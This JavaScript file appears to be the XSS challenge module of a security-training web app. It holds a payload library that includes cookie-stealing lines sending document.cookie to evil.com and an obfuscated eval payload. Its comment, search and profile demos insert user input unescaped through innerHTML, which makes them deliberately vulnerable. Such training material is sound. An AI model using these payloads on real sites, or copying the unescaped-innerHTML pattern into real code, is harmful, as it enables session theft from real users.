/**
 * XSS Challenge Interface
 * Interactive XSS demonstration and testing environment
 */

if (!window.SecureTrainer) {
    window.SecureTrainer = {};
}

SecureTrainer.XSSChallenges = {
    // XSS payload library
    payloads: {
        basic: [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')">',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ],
        advanced: [
            '<script>fetch("/admin").then(r=>r.text()).then(d=>alert(d))</script>',
            '<img src="x" onerror="document.location=\'http://evil.com/steal?cookie=\'+document.cookie">',
            '<script>new Image().src="http://evil.com/log?"+document.cookie</script>',
            '<svg/onload="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">',
            '<script>setTimeout(function(){alert("Delayed XSS")},2000)</script>'
        ],
        filter_bypass: [
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
            '<svg onload="window[\'ale\'+\'rt\'](\'XSS\')">',
            '<script>window["eval"]("alert(\'XSS\')")</script>',
            '<img src="javascript:alert(\'XSS\')">'
        ]
    },

    // Vulnerable application contexts
    vulnerableApps: {
        commentSystem: {
            name: "Comment System",
            description: "A vulnerable blog comment system",
            sanitization: "none",
            context: "html"
        },
        searchBox: {
            name: "Search Results",
            description: "Search results page with reflected input",
            sanitization: "basic",
            context: "attribute"
        },
        userProfile: {
            name: "User Profile",
            description: "User profile page with stored XSS",
            sanitization: "incomplete",
            context: "html"
        }
    },

    currentChallenge: null,
    challengeHistory: [],

    init() {
        this.createXSSInterface();
        this.loadVulnerableApp('commentSystem');
        this.setupEventListeners();
    },

    createXSSInterface() {
        const container = document.getElementById('challenge-workspace');
        if (!container) return;

        container.innerHTML = `
            <div class="xss-challenge-container">
                <!-- Payload Editor -->
                <div class="xss-panel">
                    <h3 class="text-lg font-semibold mb-4">XSS Payload Editor</h3>
                    <div class="mb-4">
                        <label class="block text-sm font-medium mb-2">Select Vulnerable App:</label>
                        <select id="vulnerable-app-select" class="w-full px-3 py-2 border rounded-lg">
                            <option value="commentSystem">Comment System</option>
                            <option value="searchBox">Search Box</option>
                            <option value="userProfile">User Profile</option>
                        </select>
                    </div>
                    <div class="mb-4">
                        <label class="block text-sm font-medium mb-2">XSS Payload:</label>
                        <textarea id="xss-payload" 
                                placeholder="Enter your XSS payload here..."
                                class="w-full h-32 px-3 py-2 border rounded-lg font-mono text-sm"></textarea>
                    </div>
                    <div class="flex gap-2 mb-4">
                        <button id="test-payload-btn" class="btn-primary">Test Payload</button>
                        <button id="load-example-btn" class="btn-secondary">Load Example</button>
                        <button id="clear-payload-btn" class="btn-secondary">Clear</button>
                    </div>
                    
                    <!-- Payload Library -->
                    <div class="payload-library">
                        <h4 class="font-medium mb-2">Payload Library:</h4>
                        <div class="grid grid-cols-3 gap-2 mb-4">
                            <button class="payload-category-btn" data-category="basic">Basic</button>
                            <button class="payload-category-btn" data-category="advanced">Advanced</button>
                            <button class="payload-category-btn" data-category="filter_bypass">Filter Bypass</button>
                        </div>
                        <div id="payload-list" class="max-h-32 overflow-y-auto"></div>
                    </div>
                </div>

                <!-- Vulnerable Application Simulator -->
                <div class="xss-panel">
                    <h3 class="text-lg font-semibold mb-4">Vulnerable Application</h3>
                    <div id="vulnerable-app-container" class="border rounded-lg p-4 bg-gray-50">
                        <!-- Dynamic vulnerable app content -->
                    </div>
                </div>

                <!-- Results Panel -->
                <div class="xss-panel">
                    <h3 class="text-lg font-semibold mb-4">Test Results</h3>
                    <div id="xss-results" class="border rounded-lg p-4 min-h-32">
                        <p class="text-gray-500">No tests run yet. Select a payload and click "Test Payload".</p>
                    </div>
                    <div class="mt-4">
                        <h4 class="font-medium mb-2">Challenge Progress:</h4>
                        <div class="progress-bar">
                            <div id="xss-progress" class="progress-fill" style="width: 0%"></div>
                        </div>
                        <div class="text-sm text-gray-600 mt-1">
                            <span id="xss-score">0</span> / 100 points
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    loadVulnerableApp(appType) {
        const container = document.getElementById('vulnerable-app-container');
        const app = this.vulnerableApps[appType];
        
        if (!container || !app) return;

        let appHTML = '';
        switch(appType) {
            case 'commentSystem':
                appHTML = this.createCommentSystem();
                break;
            case 'searchBox':
                appHTML = this.createSearchBox();
                break;
            case 'userProfile':
                appHTML = this.createUserProfile();
                break;
        }

        container.innerHTML = `
            <div class="vulnerable-app">
                <h4 class="font-medium mb-2">${app.name}</h4>
                <p class="text-sm text-gray-600 mb-4">${app.description}</p>
                <div class="app-content">
                    ${appHTML}
                </div>
            </div>
        `;
    },

    createCommentSystem() {
        return `
            <div class="comment-system">
                <h5 class="font-medium mb-3">Blog Comments</h5>
                <div class="existing-comments mb-4">
                    <div class="comment mb-2 p-2 bg-white rounded border">
                        <strong>Alice:</strong> Great article! Very informative.
                    </div>
                    <div class="comment mb-2 p-2 bg-white rounded border">
                        <strong>Bob:</strong> Thanks for sharing this knowledge.
                    </div>
                </div>
                <div class="add-comment">
                    <textarea id="comment-input" placeholder="Add your comment..." 
                            class="w-full p-2 border rounded mb-2"></textarea>
                    <button id="submit-comment" class="btn-primary text-sm">Post Comment</button>
                </div>
                <div id="new-comments"></div>
            </div>
        `;
    },

    createSearchBox() {
        return `
            <div class="search-system">
                <h5 class="font-medium mb-3">Product Search</h5>
                <div class="search-form mb-4">
                    <input type="text" id="search-input" placeholder="Search products..." 
                           class="w-full p-2 border rounded mb-2">
                    <button id="search-submit" class="btn-primary text-sm">Search</button>
                </div>
                <div id="search-results">
                    <p class="text-gray-500">Enter a search term above...</p>
                </div>
            </div>
        `;
    },

    createUserProfile() {
        return `
            <div class="profile-system">
                <h5 class="font-medium mb-3">User Profile</h5>
                <div class="profile-form">
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Display Name:</label>
                        <input type="text" id="profile-name" placeholder="Your display name" 
                               class="w-full p-2 border rounded">
                    </div>
                    <div class="mb-3">
                        <label class="block text-sm mb-1">Bio:</label>
                        <textarea id="profile-bio" placeholder="Tell us about yourself..." 
                                class="w-full p-2 border rounded"></textarea>
                    </div>
                    <button id="update-profile" class="btn-primary text-sm">Update Profile</button>
                </div>
                <div class="profile-display mt-4 p-3 bg-white border rounded">
                    <h6 class="font-medium">Current Profile:</h6>
                    <div id="display-name">Anonymous User</div>
                    <div id="display-bio" class="text-sm text-gray-600 mt-1">No bio set</div>
                </div>
            </div>
        `;
    },

    setupEventListeners() {
        // Vulnerable app selector
        const appSelect = document.getElementById('vulnerable-app-select');
        if (appSelect) {
            appSelect.addEventListener('change', (e) => {
                this.loadVulnerableApp(e.target.value);
                this.setupAppEventListeners();
            });
        }

        // Payload editor buttons
        const testBtn = document.getElementById('test-payload-btn');
        if (testBtn) {
            testBtn.addEventListener('click', () => this.testPayload());
        }

        const loadExampleBtn = document.getElementById('load-example-btn');
        if (loadExampleBtn) {
            loadExampleBtn.addEventListener('click', () => this.loadRandomPayload());
        }

        const clearBtn = document.getElementById('clear-payload-btn');
        if (clearBtn) {
            clearBtn.addEventListener('click', () => {
                document.getElementById('xss-payload').value = '';
            });
        }

        // Payload category buttons
        document.querySelectorAll('.payload-category-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.showPayloadCategory(e.target.dataset.category);
            });
        });

        this.setupAppEventListeners();
    },

    setupAppEventListeners() {
        // Comment system
        const submitComment = document.getElementById('submit-comment');
        if (submitComment) {
            submitComment.addEventListener('click', () => {
                const input = document.getElementById('comment-input');
                const newComments = document.getElementById('new-comments');
                if (input && newComments) {
                    const comment = input.value;
                    if (comment.trim()) {
                        const commentDiv = document.createElement('div');
                        commentDiv.className = 'comment mb-2 p-2 bg-yellow-50 rounded border';
                        commentDiv.innerHTML = `<strong>You:</strong> ${comment}`;
                        newComments.appendChild(commentDiv);
                        input.value = '';
                    }
                }
            });
        }

        // Search system
        const searchSubmit = document.getElementById('search-submit');
        if (searchSubmit) {
            searchSubmit.addEventListener('click', () => {
                const input = document.getElementById('search-input');
                const results = document.getElementById('search-results');
                if (input && results) {
                    const query = input.value;
                    results.innerHTML = `
                        <div class="search-result">
                            <h6>Search Results for: ${query}</h6>
                            <p class="text-sm text-gray-600">No products found matching "${query}"</p>
                        </div>
                    `;
                }
            });
        }

        // Profile system
        const updateProfile = document.getElementById('update-profile');
        if (updateProfile) {
            updateProfile.addEventListener('click', () => {
                const nameInput = document.getElementById('profile-name');
                const bioInput = document.getElementById('profile-bio');
                const displayName = document.getElementById('display-name');
                const displayBio = document.getElementById('display-bio');
                
                if (nameInput && bioInput && displayName && displayBio) {
                    displayName.innerHTML = nameInput.value || 'Anonymous User';
                    displayBio.innerHTML = bioInput.value || 'No bio set';
                }
            });
        }
    },

    showPayloadCategory(category) {
        const payloadList = document.getElementById('payload-list');
        if (!payloadList || !this.payloads[category]) return;

        const payloads = this.payloads[category];
        payloadList.innerHTML = payloads.map(payload => `
            <div class="payload-item mb-2 p-2 bg-gray-100 rounded cursor-pointer hover:bg-gray-200"
                 onclick="SecureTrainer.XSSChallenges.selectPayload('${payload.replace(/'/g, "\\'")}')">
                <code class="text-xs">${this.escapeHtml(payload)}</code>
            </div>
        `).join('');
    },

    selectPayload(payload) {
        const textarea = document.getElementById('xss-payload');
        if (textarea) {
            textarea.value = payload;
        }
    },

    loadRandomPayload() {
        const categories = Object.keys(this.payloads);
        const randomCategory = categories[Math.floor(Math.random() * categories.length)];
        const payloads = this.payloads[randomCategory];
        const randomPayload = payloads[Math.floor(Math.random() * payloads.length)];
        
        this.selectPayload(randomPayload);
    },

    testPayload() {
        const payload = document.getElementById('xss-payload').value;
        const appType = document.getElementById('vulnerable-app-select').value;
        
        if (!payload.trim()) {
            this.showResults('Error: Please enter a payload to test', 'error');
            return;
        }

        // Simulate XSS testing (safe simulation)
        const result = this.simulateXSSTest(payload, appType);
        this.showResults(result.message, result.type);
        
        if (result.type === 'success') {
            this.updateProgress(result.points);
        }
    },

    simulateXSSTest(payload, appType) {
        // Safe simulation of XSS testing
        const dangerous = ['<script', 'javascript:', 'onerror', 'onload', 'eval('];
        const hasDangerous = dangerous.some(pattern => 
            payload.toLowerCase().includes(pattern.toLowerCase())
        );

        if (!hasDangerous) {
            return {
                type: 'info',
                message: 'Payload appears safe - no dangerous patterns detected.',
                points: 5
            };
        }

        // Simulate different app responses
        const responses = {
            commentSystem: {
                message: `XSS detected! Payload would execute in comment system. The comment containing "${this.escapeHtml(payload)}" would trigger script execution when other users view the page.`,
                points: 15
            },
            searchBox: {
                message: `Reflected XSS detected! The search term "${this.escapeHtml(payload)}" would be reflected in the search results page and execute immediately.`,
                points: 10
            },
            userProfile: {
                message: `Stored XSS detected! The profile update with "${this.escapeHtml(payload)}" would be stored and execute whenever the profile is viewed.`,
                points: 20
            }
        };

        return {
            type: 'success',
            ...responses[appType]
        };
    },

    showResults(message, type) {
        const resultsContainer = document.getElementById('xss-results');
        if (!resultsContainer) return;

        const typeClasses = {
            success: 'text-green-700 bg-green-50 border-green-200',
            error: 'text-red-700 bg-red-50 border-red-200',
            info: 'text-blue-700 bg-blue-50 border-blue-200'
        };

        resultsContainer.innerHTML = `
            <div class="p-3 rounded border ${typeClasses[type] || typeClasses.info}">
                ${message}
            </div>
        `;
    },

    updateProgress(points) {
        const currentScore = parseInt(document.getElementById('xss-score').textContent) || 0;
        const newScore = Math.min(currentScore + points, 100);
        
        document.getElementById('xss-score').textContent = newScore;
        document.getElementById('xss-progress').style.width = newScore + '%';
        
        if (newScore >= 100) {
            SecureTrainer.Analytics.trackChallengeCompletion('xss', newScore);
        }
    },

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
};

// Auto-initialize when challenge is loaded
document.addEventListener('DOMContentLoaded', () => {
    if (document.getElementById('challenge-workspace')) {
        SecureTrainer.XSSChallenges.init();
    }
});